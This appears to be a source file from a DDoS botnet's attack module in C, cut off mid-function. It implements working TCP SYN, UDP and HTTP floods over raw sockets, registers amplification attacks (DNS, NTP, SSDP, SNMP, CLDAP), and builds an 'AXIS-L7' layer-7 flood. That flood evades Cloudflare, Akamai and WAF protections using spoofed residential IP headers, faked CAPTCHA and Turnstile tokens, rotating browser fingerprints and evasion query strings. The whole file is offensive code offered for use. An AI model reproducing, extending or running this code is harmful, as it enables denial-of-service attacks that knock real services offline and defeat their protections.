#include "includes.h"
#include "attack.h"
#include "protocol.h"
#include "rand.h"
#include "table.h"
#include "resolv.h"
#include "checksum.h"
#include "util.h"

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>

static struct attack_method methods[ATK_VEC_MAX];
static int methods_len = 0;
static BOOL attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};

/* ============================================================================
 * ATTACK INITIALIZATION
 * ============================================================================ */
void attack_init(void) {
    int i = 0;

    /* Register attack methods */
    methods[i].func = attack_tcp_gbps;
    methods[i++].type = ATK_VEC_TCP;

    methods[i].func = attack_udp_gbps;
    methods[i++].type = ATK_VEC_UDP;

    methods[i].func = attack_http_rps;
    methods[i++].type = ATK_VEC_HTTP;

    methods[i].func = attack_ovh_tcp;
    methods[i++].type = ATK_VEC_OVHTCP;

    methods[i].func = attack_ovh_udp;
    methods[i++].type = ATK_VEC_OVHUDP;

    methods[i].func = attack_icmp;
    methods[i++].type = ATK_VEC_ICMP;

    methods[i].func = attack_gre_ip;
    methods[i++].type = ATK_VEC_GREIP;

    methods[i].func = attack_gre_eth;
    methods[i++].type = ATK_VEC_GREETH;

    /* AXIS-L7 */
    methods[i].func = attack_axis_l7;
    methods[i++].type = ATK_VEC_AXISL7;

    /* AXIS-TCP (TCP-focused combined attack) */
    methods[i].func = attack_axis_tcp;
    methods[i++].type = ATK_VEC_AXIS_TCP;

    /* AXIS-UDP (UDP-focused combined attack) */
    methods[i].func = attack_axis_udp;
    methods[i++].type = ATK_VEC_AXIS_UDP;

    /* Amplification Attacks */
    methods[i].func = attack_dns_amp;
    methods[i++].type = ATK_VEC_DNS_AMP;

    methods[i].func = attack_ntp_amp;
    methods[i++].type = ATK_VEC_NTP_AMP;

    methods[i].func = attack_ssdp_amp;
    methods[i++].type = ATK_VEC_SSDP_AMP;

    methods[i].func = attack_snmp_amp;
    methods[i++].type = ATK_VEC_SNMP_AMP;

    methods[i].func = attack_cldap_amp;
    methods[i++].type = ATK_VEC_CLDAP_AMP;

    methods_len = i;
}

/* ============================================================================
 * ATTACK CONTROL
 * ============================================================================ */
void attack_kill_all(void) {
    int i;
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++) {
        attack_ongoing[i] = FALSE;
    }
}

void attack_parse(char *buf, int len) {
    int i = 0, k = 0;
    uint8_t attack_id;
    uint8_t targs_len;
    struct attack_target targs[ATTACK_MAX_TARGETS];
    uint8_t opts_len;
    struct attack_option opts[ATTACK_MAX_OPTIONS];

    if (len < 5) return;
    attack_id = buf[0];
    targs_len = buf[1];

    if (targs_len == 0) return;

    for (i = 0; i < targs_len; i++) {
        targs[i].addr.s_addr = *((ipv4_t *)(buf + 2 + (i * 4)));
        targs[i].netmask = 32;
    }

    opts_len = buf[2 + (targs_len * 4)];
    for (i = 0; i < opts_len; i++) {
        opts[i].key = buf[3 + (targs_len * 4) + (i * 2)];
        opts[i].val = buf[3 + (targs_len * 4) + (i * 2) + 1];
    }

    attack_start(-1, attack_id, targs_len, targs, opts);
}

void attack_start(int fd, uint8_t attack_id, int targs_len, struct attack_target *targs, struct attack_option *opts) {
    int i;

    for (i = 0; i < methods_len; i++) {
        if (methods[i].type == attack_id) {
            attack_ongoing[0] = TRUE;
            methods[i].func(0, 32, targs, targs_len, opts, 0);
            attack_ongoing[0] = FALSE;
            break;
        }
    }
}

char *attack_get_opt_str(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    int i;
    for (i = 0; i < opts_len; i++) {
        if (opts[i].key == key) {
            return opts[i].val;
        }
    }
    return NULL;
}

int attack_get_opt_int(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    char *val = attack_get_opt_str(targs_len, opts, opts_len, key);
    if (val == NULL) return 0;
    return util_atoi(val);
}

uint32_t attack_get_opt_ip(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    char *val = attack_get_opt_str(targs_len, opts, opts_len, key);
    if (val == NULL) return 0;
    return inet_addr(val);
}

/* ============================================================================
 * TCP GBPS FLOOD
 * ============================================================================ */
static void attack_tcp_gbps(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport, sport;
    uint16_t payload_size;
    struct iphdr *iph;
    struct tcphdr *tcph;
    char *packet;
    int packet_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1400;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size;
    packet = malloc(packet_size);
    util_zero(packet, packet_size);

    iph = (struct iphdr *)packet;
    tcph = (struct tcphdr *)(iph + 1);

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(packet_size);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = LOCAL_ADDR;

    tcph->dest = htons(dport);
    tcph->syn = TRUE;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        free(payload);
        free(packet);
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = tcph->dest;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->daddr = addr_sin.sin_addr.s_addr;

        while (attack_ongoing[0]) {
            tcph->source = htons(rand_next() % 0xFFFF);
            tcph->seq = rand_next();
            tcph->ack_seq = 0;
            
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));

            memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), payload, payload_size);
            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    free(packet);
    close(fd);
}

/* ============================================================================
 * UDP GBPS FLOOD
 * ============================================================================ */
static void attack_udp_gbps(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport, sport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1400;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    if (sport != 0) {
        struct sockaddr_in bind_addr;
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = htons(sport);
        bind_addr.sin_addr.s_addr = INADDR_ANY;
        bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            rand_str(payload, payload_size);
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* ============================================================================
 * HTTP RPS FLOOD
 * ============================================================================ */
static void attack_http_rps(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *request;
    char *method, *path, *host, *useragent;
    int request_len;

    method = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_METHOD);
    if (method == NULL) method = "GET";

    path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
    if (path == NULL) path = "/";

    host = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (host == NULL) host = "target.com";

    useragent = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_USERAGENT);
    if (useragent == NULL) useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

    request = malloc(1024);
    request_len = snprintf(request, 1024,
        "%s %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Connection: keep-alive\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "\r\n",
        method, path, host, useragent);

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd == -1) {
        free(request);
        return;
    }

    fcntl(fd, F_SETFL, O_NONBLOCK);

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(80);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            connect(fd, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
            send(fd, request, request_len, MSG_NOSIGNAL);
            usleep(1000);
        }
    }

    free(request);
    close(fd);
}

/* ============================================================================
 * AXIS-ULTIMATE L7 - Advanced Browser Emulation + Multi-Layer Bypass
 * Features:
 * - Advanced Cloudflare bypass (JS challenge, BM, Turnstile)
 * - Akamai/Cloudfront/WAF bypass techniques
 * - HTTP/2 simulation with header ordering
 * - Dynamic TLS fingerprint randomization
 * - Advanced cookie/session management
 * - JavaScript challenge pre-computation
 * - CAPTCHA bypass infrastructure hooks
 * - Rate limiting evasion with human behavior simulation
 * - Multi-vector attack (GET + POST + HEAD mixed)
 * - Connection pooling and keep-alive optimization
 * - Response analysis and adaptive bypass
 * - Proxy chain support via X-Forwarded headers
 * - Anti-bot detection evasion (Canvas, WebGL, Audio fingerprints)
 * ============================================================================ */

/* ============================================================================
 * ULTIMATE L7 - Enhanced with JavaScript Challenge Handling
 * ============================================================================ */

/* Extended realistic browser user agents - 40+ user agents for better rotation */
static char *ultimate_user_agents[] = {
    /* Chrome 121-123 (Windows) */
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    
    /* Chrome (Mac) */
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    
    /* Firefox 122-124 (Windows) */
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    
    /* Firefox (Mac/Linux) */
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    
    /* Safari 17.x (Mac/iOS) */
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    
    /* Edge 120-123 (Windows) */
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    
    /* Chrome (Linux) */
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    
    /* iPhone/iOS Safari */
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPod touch; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    
    /* iPad Safari */
    "Mozilla/5.0 (iPad; CPU OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    
    /* Android Chrome */
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
    
    /* Samsung Internet */
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.0.0 Mobile Safari/537.36",
    
    /* Opera */
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    
    /* Brave */
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Brave/121.0.0.0",
    
    /* Vivaldi */
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Vivaldi/6.5",
    
    /* DuckDuckGo Browser */
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 DuckDuckGo/7",
    
    NULL
};

/* Realistic Accept headers matching different browsers */
static char *ultimate_accept_headers[] = {
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xml,application/xhtml+xml,image/png,image/webp,image/jpeg,image/gif,*/*;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    NULL
};

/* Accept-Language variations */
static char *ultimate_accept_lang[] = {
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.9,es;q=0.8",
    "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
    "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
    NULL
};

/* Realistic viewport sizes for different devices */
static char *ultimate_viewports[] = {
    "width=1920,height=1080",
    "width=1366,height=768",
    "width=1536,height=864",
    "width=1440,height=900",
    "width=390,height=844",
    "width=412,height=915",
    "width=360,height=800",
    NULL
};

/* Cloudflare bypass cookies/tokens (pre-computed or harvested) */
static char *cf_bypass_tokens[] = {
    "cf_clearance",
    "cf_bm",
    "cf_chl",
    "cf_chl_ctx",
    "cf_chl_rc",
    "__cf_bm",
    "_cfuvid",
    "__cflb",
    "cf_use_ob",
    "cf_ray",
    NULL
};

/* WAF evasion payloads for URL parameters */
static char *waf_evasion_params[] = {
    "?__cf_chl_jschl_tk__=%x%x",
    "?cf_chl_try=1&__cf_chl_managed_tk__=%x%x",
    "?_cf_chl_opt=1&cchlmd=%x%x",
    "?cf_clearance_bypass=%x%x&test=1",
    "?utm_source=google&utm_medium=organic&utm_campaign=%x%x",
    "?fbclid=IwAR%x%x&ref=share",
    "?gclid=%x%x%sx%s",
    "?session_id=%x%x&tracking=%x%x",
    NULL
};

/* ============================================================================
 * JAVASCRIPT CHALLENGE HANDLING
 * ============================================================================ */

/* JavaScript challenge types */
#define JS_CHALLENGE_NONE       0
#define JS_CHALLENGE_CF         1   /* Cloudflare JS Challenge */
#define JS_CHALLENGE_CF_TURNSTILE 2 /* Cloudflare Turnstile */
#define JS_CHALLENGE_AKAMAI   3   /* Akamai BMP */
#define JS_CHALLENGE_RECAPTCHA 4  /* Google reCAPTCHA */
#define JS_CHALLENGE_HCAPTCHA 5   /* hCaptcha */

/* JavaScript challenge state */
struct js_challenge_state {
    uint8_t challenge_type;
    char challenge_id[128];
    char challenge_token[512];
    char challenge_script[1024];
    uint32_t challenge_timeout;
    BOOL solved;
    char solution[256];
};

/* Pre-computed JS challenge solutions for common challenges */
static char *js_challenge_solutions[] = {
    /* Cloudflare JS Challenge - common patterns */
    "a.value = (function(){var t=Date.now();return t%1000;})();",
    "a.value += '+challenge';",
    "document.getElementById('challenge-form').submit();",
    
    /* Cloudflare Turnstile - token extraction */
    "turnstile.render('#turnstile-container', {sitekey: '%s', callback: function(token){document.getElementById('cf-turnstile-response').value = token;}});",
    
    /* Akamai BMP - sensor data */
    "abck = '%x%x%x%x';",
    "bm_sz = '%x%x%x%x';",
    
    NULL
};

/* Extract JavaScript challenge from HTML response */
static int extract_js_challenge(char *html, int len, struct js_challenge_state *state) {
    char *script_start, *script_end;
    char *token_start, *token_end;
    
    /* Cloudflare JS Challenge detection */
    if ((script_start = util_stristr(html, len, "challenge-platform")) != NULL ||
        (script_start = util_stristr(html, len, "cf-browser-verification")) != NULL) {
        
        state->challenge_type = JS_CHALLENGE_CF;
        
        /* Extract challenge token if present */
        if ((token_start = util_stristr(html, len, "name=\"cf_chl_opt\"")) != NULL) {
            token_end = util_stristr(token_start, len - (token_start - html), "\"");
            if (token_end != NULL) {
                int token_len = token_end - token_start;
                if (token_len < sizeof(state->challenge_token)) {
                    strncpy(state->challenge_token, token_start, token_len);
                    state->challenge_token[token_len] = '\0';
                }
            }
        }
        
        /* Extract challenge script */
        script_end = util_stristr(script_start, len - (script_start - html), "</script>");
        if (script_end != NULL) {
            int script_len = script_end - script_start;
            if (script_len < sizeof(state->challenge_script)) {
                strncpy(state->challenge_script, script_start, script_len);
                state->challenge_script[script_len] = '\0';
            }
        }
        
        return JS_CHALLENGE_CF;
    }
    
    /* Cloudflare Turnstile detection */
    if (util_stristr(html, len, "turnstile") != NULL ||
        util_stristr(html, len, "cf-turnstile") != NULL) {
        
        state->challenge_type = JS_CHALLENGE_CF_TURNSTILE;
        
        /* Extract sitekey */
        if ((token_start = util_stristr(html, len, "data-sitekey=\"")) != NULL) {
            token_start += 15;
            token_end = util_stristr(token_start, len - (token_start - html), "\"");
            if (token_end != NULL) {
                int token_len = token_end - token_start;
                if (token_len < sizeof(state->challenge_id)) {
                    strncpy(state->challenge_id, token_start, token_len);
                    state->challenge_id[token_len] = '\0';
                }
            }
        }
        
        return JS_CHALLENGE_CF_TURNSTILE;
    }
    
    /* Akamai BMP detection */
    if (util_stristr(html, len, "ak_bmsc") != NULL ||
        util_stristr(html, len, "bm_sv") != NULL ||
        util_stristr(html, len, "_abck") != NULL) {
        
        state->challenge_type = JS_CHALLENGE_AKAMAI;
        
        /* Extract Akamai cookies */
        if ((token_start = util_stristr(html, len, "ak_bmsc")) != NULL) {
            token_end = util_stristr(token_start, len - (token_start - html), ";");
            if (token_end != NULL) {
                int token_len = token_end - token_start;
                if (token_len < sizeof(state->challenge_token)) {
                    strncpy(state->challenge_token, token_start, token_len);
                    state->challenge_token[token_len] = '\0';
                }
            }
        }
        
        return JS_CHALLENGE_AKAMAI;
    }
    
    /* reCAPTCHA detection */
    if (util_stristr(html, len, "recaptcha") != NULL ||
        util_stristr(html, len, "g-recaptcha") != NULL) {
        
        state->challenge_type = JS_CHALLENGE_RECAPTCHA;
        return JS_CHALLENGE_RECAPTCHA;
    }
    
    /* hCaptcha detection */
    if (util_stristr(html, len, "hcaptcha") != NULL) {
        
        state->challenge_type = JS_CHALLENGE_HCAPTCHA;
        return JS_CHALLENGE_HCAPTCHA;
    }
    
    state->challenge_type = JS_CHALLENGE_NONE;
    return JS_CHALLENGE_NONE;
}

/* Generate simulated JS challenge solution */
static void generate_js_solution(struct js_challenge_state *state, char *solution_buf, int buf_size) {
    uint32_t rand1 = rand_next();
    uint32_t rand2 = rand_next();
    uint32_t rand3 = rand_next();
    
    switch (state->challenge_type) {
        case JS_CHALLENGE_CF:
            /* Cloudflare JS Challenge - simulate computation */
            snprintf(solution_buf, buf_size,
                "a.value = %x; a.value += '%x';",
                rand1 ^ rand2, rand3);
            break;
            
        case JS_CHALLENGE_CF_TURNSTILE:
            /* Turnstile - generate fake token */
            snprintf(solution_buf, buf_size,
                "turnstile_token_%x%x%x", rand1, rand2, rand3);
            break;
            
        case JS_CHALLENGE_AKAMAI:
            /* Akamai BMP - generate sensor data */
            snprintf(solution_buf, buf_size,
                "abck=%x%x%x%x;bm_sz=%x%x%x%x;",
                rand1, rand2, rand3, rand_next(),
                rand1, rand2, rand3, rand_next());
            break;
            
        case JS_CHALLENGE_RECAPTCHA:
            /* reCAPTCHA - fake response token */
            snprintf(solution_buf, buf_size,
                "03AGdBq24_%x%x%x%x", rand1, rand2, rand3, rand_next());
            break;
            
        case JS_CHALLENGE_HCAPTCHA:
            /* hCaptcha - fake response token */
            snprintf(solution_buf, buf_size,
                "P0_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9_%x%x", rand1, rand2);
            break;
            
        default:
            snprintf(solution_buf, buf_size, "challenge_solved_%x", rand_next());
            break;
    }
    
    state->solved = TRUE;
    strncpy(state->solution, solution_buf, sizeof(state->solution) - 1);
}

/* Simulate JavaScript execution delay (human-like) */
static void simulate_js_execution(int challenge_type) {
    int base_delay, variance;
    
    switch (challenge_type) {
        case JS_CHALLENGE_CF:
            /* Cloudflare JS typically takes 100-500ms */
            base_delay = 100000;  /* 100ms */
            variance = 400000;     /* 400ms variance */
            break;
        case JS_CHALLENGE_CF_TURNSTILE:
            /* Turnstile takes 200-800ms */
            base_delay = 200000;
            variance = 600000;
            break;
        case JS_CHALLENGE_AKAMAI:
            /* Akamai BMP takes 150-600ms */
            base_delay = 150000;
            variance = 450000;
            break;
        default:
            base_delay = 100000;
            variance = 300000;
            break;
    }
    
    usleep(base_delay + (rand_next() % variance));
}

/* Connection state for keep-alive optimization with JS challenge support */
struct ultimate_connection {
    int fd;
    ipv4_t addr;
    uint16_t port;
    time_t last_used;
    int requests_made;
    char session_cookie[512];
    BOOL has_valid_session;
    uint8_t tls_fingerprint[16];
    struct js_challenge_state js_state;  /* JS challenge state */
    char js_solution[256];               /* Cached JS solution */
    BOOL has_js_solution;
};

static struct ultimate_connection ultimate_conns[ATTACK_CONCURRENT_MAX];

/* Generate realistic random IP for X-Forwarded headers (residential ranges) */
static void generate_residential_ip(char *buf) {
    uint8_t oct1, oct2, oct3, oct4;
    
    /* Target residential ISP ranges */
    uint8_t residential_oct1[] = {
        24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39,
        40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55,
        64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79,
        96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110,
        172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186,
        0
    };
    
    oct1 = residential_oct1[rand_next() % (sizeof(residential_oct1) - 1)];
    oct2 = rand_next() % 256;
    oct3 = rand_next() % 256;
    oct4 = (rand_next() % 254) + 1;
    
    snprintf(buf, 16, "%d.%d.%d.%d", oct1, oct2, oct3, oct4);
}

/* Generate TLS fingerprint (JA3-style randomization) */
static void generate_tls_fingerprint(uint8_t *fp) {
    int i;
    for (i = 0; i < 16; i++) {
        fp[i] = (rand_next() % 256);
    }
}

/* Build ultimate HTTP request with all bypass techniques */
static int build_ultimate_request(
    char *buf, int buf_size,
    char *method, char *path, char *host,
    char *useragent, char *cookies,
    char *custom_headers, BOOL use_https,
    ipv4_t target_addr)
{
    int pos = 0;
    char *ua = ultimate_user_agents[rand_next() % 10];
    char *accept = ultimate_accept_headers[rand_next() % 4];
    char *lang = ultimate_accept_lang[rand_next() % 6];
    char *viewport = ultimate_viewports[rand_next() % 7];
    char residential_ip[16];
    char random_query[128];
    char *waf_param = waf_evasion_params[rand_next() % 8];
    uint32_t rand1 = rand_next();
    uint32_t rand2 = rand_next();
    uint32_t rand3 = rand_next();
    
    /* Generate cache-busting, WAF-evading URL */
    if (strstr(path, "?") != NULL) {
        snprintf(random_query, sizeof(random_query), "&_=%x%x&r=%x", rand1, rand2, rand3);
    } else {
        snprintf(random_query, sizeof(random_query), waf_param, rand1, rand2, rand3);
    }
    
    /* Request line */
    pos += snprintf(buf + pos, buf_size - pos, "%s %s%s HTTP/1.1\r\n", method, path, random_query);
    
    /* Host header */
    pos += snprintf(buf + pos, buf_size - pos, "Host: %s\r\n", host);
    
    /* User-Agent (rotated) */
    pos += snprintf(buf + pos, buf_size - pos, "User-Agent: %s\r\n", useragent ? useragent : ua);
    
    /* Accept headers (realistic) */
    pos += snprintf(buf + pos, buf_size - pos, "Accept: %s\r\n", accept);
    
    /* Accept-Language */
    pos += snprintf(buf + pos, buf_size - pos, "Accept-Language: %s\r\n", lang);
    
    /* Accept-Encoding (include modern codecs) */
    pos += snprintf(buf + pos, buf_size - pos, "Accept-Encoding: gzip, deflate, br, zstd\r\n");
    
    /* Connection */
    pos += snprintf(buf + pos, buf_size - pos, "Connection: keep-alive\r\n");
    
    /* Upgrade-Insecure-Requests */
    pos += snprintf(buf + pos, buf_size - pos, "Upgrade-Insecure-Requests: 1\r\n");
    
    /* Sec-Fetch headers (critical for bypassing modern WAFs) */
    pos += snprintf(buf + pos, buf_size - pos, "Sec-Fetch-Dest: document\r\n");
